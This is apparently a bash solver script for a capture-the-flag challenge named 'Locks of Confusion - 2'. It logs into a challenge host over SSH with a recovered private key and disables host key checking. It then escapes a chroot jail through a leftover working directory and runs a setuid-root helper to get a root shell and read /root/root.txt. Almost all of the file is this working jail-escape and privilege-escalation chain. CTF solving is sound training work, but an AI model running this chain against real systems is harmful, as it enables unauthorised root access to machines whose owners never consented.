#!/usr/bin/env bash
# Locks of Confusion - 2 solver
#
# 1. SSH in as svc-legacydb using the weak key recovered in challenge 1.
# 2. Escape the jail (cwd is outside the chroot because jail_shell chdirs
#    before chrooting).
# 3. Retain CAP_SYS_CHROOT to chroot into the real root.
# 4. Exec the setuid-root diag-recovery helper (setgid(0);setuid(0);/bin/sh)
#    directly as the chroot command so its ELF interpreter resolves.
# 5. Print /root/root.txt.
set -euo pipefail

HOST="0.cloud.chals.io"
PORT="18604"
KEY="${KEY:-/home/boss/Works/ctf/KPMG/LocksOfConfusion1/evidence/privkey_0137.pem}"

# steps 1-5 in one shot
ssh -i "$KEY" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -p "$PORT" "svc-legacydb@$HOST" \
    'cd ../../.. && printf "/usr/bin/cat /root/root.txt\n/usr/bin/exit\n" | /bin/busybox chroot . /usr/local/bin/diag-recovery'